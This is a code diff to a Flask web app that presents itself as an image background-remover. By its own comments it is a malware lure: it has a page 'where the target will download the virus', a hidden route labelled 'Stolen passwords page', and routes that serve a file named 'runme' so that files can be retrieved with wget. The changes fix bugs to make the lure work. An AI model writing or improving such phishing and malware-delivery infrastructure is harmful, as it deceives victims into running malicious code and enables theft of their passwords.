@@ -85,18 +85,24 @@ def proceed():
     # Path for image with removed background
     processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)
     
-    subprocess.run(["backgroundremover", f"-i {upload_path} -o {processed_path}"])
+    subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])
 
     # Delete original upload
     os.remove(upload_path)
 
     flash("Image processed! Click download to get the PNG.", "success")
-    return render_template("results", filename=original_filename, img=processed_path)
+    return render_template("results.html", filename=original_filename, img=filename)
 
 # Download page where the target will download the virus
-def download():
-    return render_template("results")
-    
+@app.route("/results", methods=['GET', 'POST'])
+def results():
+    return render_template("results.html", img="15172b6d39724ad195241b1dd0e9bbff.png")
+
+# Displays edited image
+@app.route('/processed/<path:filename>')
+def get_processed(filename):
+    return send_from_directory(PROCESSED_FOLDER, filename)
+
 # Stolen passwords page
 @app.route("/pA55w0Rds")
 def passwords():
@@ -192,16 +198,16 @@ def delete_last_entry():
 # Just a page that will list all the files so we can retrieve them using wget
 @app.route('/files/', methods=['POST'])
 def list_files():
-    files = ['runme', 'cat.png'] #os.listdir('../')
+    files = ['runme'] #os.listdir('../')
     files_html = '\n'.join(
         f'<li><a href="/files/{file}">{file}</a></li>' for file in files
     )
     return f"<ul>{files_html}</ul>"
-
+    
 # Retrieving files
 @app.route('/files/<path:filename>', methods=['POST'])
 def download_file(filename):
-    return send_from_directory('../', filename)
+    return send_from_directory('../', filename)    
     
 if __name__ == "__main__":
     create_db()
